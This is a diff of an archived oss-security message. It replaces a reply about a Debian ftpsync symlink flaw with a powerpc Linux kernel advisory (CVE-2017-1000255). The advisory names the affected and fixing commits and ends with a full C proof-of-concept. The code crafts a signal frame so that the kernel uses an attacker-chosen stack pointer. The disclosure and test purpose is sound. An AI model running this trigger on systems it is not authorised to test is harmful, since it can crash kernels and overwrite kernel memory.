@@ -1,47 +1,116 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/18/11
-Message-ID: <CAOfWR+EHYftu3Hqbu0qGvk_kk3au-Gkj_WEH95syC3n-QuNnxg@mail.gmail.com>
-Date: Wed, 18 Oct 2017 12:55:21 +0000
-From: Robert Watson <robertcwatson1@...il.com>
-To: oss-security@...ts.openwall.com, Bastian Blank <waldi@...ian.org>
-Subject: Re: CVE-2017-8805: Unsafe symlinks not filtered in Debian mirror script ftpsync
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/10/3
+Message-ID: <87fuary712.fsf@concordia.ellerman.id.au>
+Date: Tue, 10 Oct 2017 15:13:29 +1100
+From: Michael Ellerman <mpe@...erman.id.au>
+To: oss-security@...ts.openwall.com <oss-security@...ts.openwall.com>
+Cc: cyrilbur@...il.com <cyrilbur@...il.com>, Gustavo Romero  <gromero@...ux.vnet.ibm.com>, leitao@...ian.org <leitao@...ian.org>
+Subject: CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling
 Content-Type: text/plain; charset=utf-8
 
-Since security is determined by file and directory permissions and
-ownership, not by symlinks, wouldn't the fact that a malicious user did not
-have permissions to access the symlink's target file/directory prevent any
-harm?
+On Linux running on PowerPC hardware (Power8 or later) a user process can craft
+a signal frame and then do a sigreturn so that the kernel will take an exception
+(interrupt), and use the r1 value from the signal frame as the kernel stack
+pointer. As part of the exception entry the content of the signal frame is
+written to the kernel stack, allowing an attacker to overwrite arbitrary
+locations with arbitrary values. The exception handling does produce an oops,
+and a panic if panic_on_oops=1, but only after kernel memory has been over
+written.
 
-On Tue, Oct 17, 2017, 12:27 Bastian Blank <waldi@...ian.org> wrote:
+The bug was introduced in commit:
 
-> Hi folks
->
-> ftpsync is the tool we use to mirror Debian everywhere.  It uses rsync
-> to do the heavy lifting.
->
-> rsync can copy symlinks.  We enable this option, as the Debian tree
-> includes symlinks in various of locations.  Unless a special option
-> (--safe-links) is given, such symlinks can point to arbitrary locations,
-> even outside of the mirror tree.
->
-> An attacker with the ability to add symlinks to the upstream mirror can
-> create symlinks to arbitrary files or even directories.  Depending on
-> the config, a HTTP server will follow such symlinks.
->
-> Upstream patch:
-> ---------------
->   ->
-> https://anonscm.debian.org/cgit/mirror/archvsync.git/commit/?id=d1ca2ab2210990b6dfb664cd6776a41b71c48016
->
-> Regards,
-> Bastian
->
-> --
-> Beam me up, Scotty!
->
--- 
+    5d176f751ee3 ("powerpc: tm: Enable transactional memory (TM) lazily for userspace")
 
-Robert "DocSalvager" Watson
-... trust in truth keeps hope alive
-www.DocSalvage.info
+Which was merged upstream into v4.9-rc1.
 
+Kernels built with CONFIG_PPC_TRANSACTIONAL_MEM=n are not vulnerable.
+
+The bug is fixed upstream in commit:
+
+  265e60a170d0 ("powerpc/64s: Use emergency stack for kernel TM Bad Thing program checks")
+
+  https://git.kernel.org/linus/265e60a170d0a0ecfc2d20490134ed2c48dd45ab
+
+Which will appear in 4.14-rc5 when it is released.
+
+A test case is available below.
+
+This issue was discovered by Gustavo Romero, Breno Leitao, Paul Mackerras, Cyril
+Bur and Michael Ellerman.
+
+cheers
+
+
+diff --git a/tm-bad-stack.c b/tm-bad-stack.c
+new file mode 100644
+index 000000000000..c2b4a25230cb
+--- /dev/null
++++ b/tm-bad-stack.c
+@@ -0,0 +1,65 @@
++/*
++ * Build with:
++ *   gcc -Wall -Werror -O2 -o tm-bad-stack tm-bad-stack.c
++ *
++ * Both patched and unpatched kernels will print an oops and kill the test case.
++ * However unpatched kernels will display a message about a bad kernel stack
++ * pointer, including the R1_VALUE defined below. eg. When the test case is
++ * built 64-bit:
++ *
++ *   Bad kernel stack pointer 5deaddeaddead000 at c00000000000becc
++ *
++ * A patched kernel should not have any "Bad kernel stack" messages, eg:
++ *
++ *  $ dmesg | grep -i "bad kernel stacK"
++ *
++ * Should return no matches.
++ *
++ * Copyright 2017, IBM Corp
++ * Licensed under GPLv2.
++ */
++
++#include <stdlib.h>
++#include <stdio.h>
++#include <signal.h>
++#include <unistd.h>
++
++
++#ifdef __powerpc64__
++#define regs(_ucp)	((_ucp)->uc_mcontext.gp_regs)
++#define R1_VALUE	0x5deaddeaddead000ul
++#else
++#define regs(_ucp)	((_ucp)->uc_mcontext.uc_regs->gregs)
++#define R1_VALUE	0x5deaddedul
++#endif
++
++void signal_usr1(int signum, siginfo_t *info, void *uc)
++{
++	ucontext_t *ucp = uc;
++
++	/* Link tm checkpointed context to normal context */
++	ucp->uc_link = ucp;
++
++	/* Clear MSR[TM] */
++	regs(ucp)[PT_MSR] &= ~(1ULL << 32);
++	/* Set MSR[TS] = 0b10 */
++	regs(ucp)[PT_MSR] |= (2ULL << 33);
++	regs(ucp)[PT_R1] = R1_VALUE;
++}
++
++int main(void)
++{
++	struct sigaction act;
++
++	act.sa_sigaction = signal_usr1;
++	sigemptyset(&act.sa_mask);
++	act.sa_flags = SA_SIGINFO;
++	if (sigaction(SIGUSR1, &act, NULL) < 0) {
++		perror("sigaction sigusr1");
++		exit(1);
++	}
++
++	raise(SIGUSR1);
++
++	return 0;
++}
+
+Download attachment "signature.asc" of type "application/pgp-signature" (819 bytes)
